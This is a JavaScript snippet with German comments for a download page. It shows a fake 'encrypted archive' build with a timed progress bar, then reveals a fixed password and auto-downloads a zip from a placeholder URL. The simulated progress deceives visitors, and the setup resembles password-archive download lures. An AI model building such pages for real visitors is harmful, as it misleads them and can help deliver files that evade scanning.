// =================== EINSTELLUNGEN ===================
// ← Ersetze die URL durch deinen direkten Link (HTTPS empfohlen)
const DIRECT_DOWNLOAD_URL = 'https://example.com/your-archive.zip';
// ← Passwort, das dem Nutzer angezeigt wird
const PASSWORD = '3578';
// Verzögerung (4–6 Sek.)
const MIN_DELAY_MS = 4000;
const MAX_DELAY_MS = 6000;
// =====================================================

const btnGet       = document.getElementById('btnGet');
const progressWrap = document.getElementById('progressWrap');
const barFill      = document.getElementById('barFill');
const statusText   = document.getElementById('statusText');
const result       = document.getElementById('result');
const passText     = document.getElementById('passText');
const manualLink   = document.getElementById('manualLink');
const live         = document.getElementById('live');

if (passText) passText.textContent = PASSWORD;

function announce(msg){ if(live) live.textContent = msg; }

function updateAria(val){
  const bar = document.querySelector('.bar');
  if(bar) bar.setAttribute('aria-valuenow', String(val));
}

function showResult(){
  if (progressWrap) progressWrap.style.display = 'none';
  if (result) result.style.display = 'block';
  if (manualLink) manualLink.setAttribute('href', DIRECT_DOWNLOAD_URL);
}

function triggerDownload(){
  const a = document.createElement('a');
  a.href = DIRECT_DOWNLOAD_URL;
  a.download = '';
  document.body.appendChild(a);
  setTimeout(()=>{ a.click(); a.remove(); }, 60);
}

function onBuildComplete(){
  announce('Archiv wurde vorbereitet. Download startet.');
  showResult();
  triggerDownload();
  if (btnGet) btnGet.disabled = false;
  if (statusText) statusText.textContent = 'Abgeschlossen';
}

function startFakeBuild(){
  if (btnGet) btnGet.disabled = true;
  if (progressWrap) progressWrap.style.display = 'block';
  if (result) result.style.display = 'none';
  if (barFill) barFill.style.width = '0%';
  if (statusText) statusText.textContent = 'Verschlüsseltes Archiv wird erstellt…';
  updateAria(0);

  const total = Math.floor(Math.random()*(MAX_DELAY_MS-MIN_DELAY_MS+1))+MIN_DELAY_MS;

  const t0 = performance.now();
  let last = 0;
  const tick = (t)=>{
    const elapsed = Math.min(t - t0, total);
    let p = elapsed / total;
    p = Math.min(1, Math.max(0, p * (0.98 + Math.sin(elapsed/350)/50)));
    const percent = Math.round(p*100);

    if(percent !== last){
      if (barFill) barFill.style.width = percent + '%';
      if (statusText) statusText.textContent = percent < 100
        ? `Vorbereitung: ${percent}%`
        : 'Abgeschlossen';
      updateAria(percent);
      last = percent;
    }
    if(elapsed < total){
      requestAnimationFrame(tick);
    }else{
      onBuildComplete();
    }
  };
  requestAnimationFrame(tick);
}

if (btnGet) btnGet.addEventListener('click', startFakeBuild);

// Sicherheits-Hinweise:
// - Achte darauf, dass die Seite selbst via HTTPS ausgeliefert wird,
//   wenn DIRECT_DOWNLOAD_URL eine HTTPS-Quelle ist (ansonsten blockiert der Browser Mixed Content).
// - Der automatische Download wird durch den Button-Klick (User Gesture) ausgelöst,
//   dadurch sollten Pop-up-Blocker i.d.R. nicht greifen.
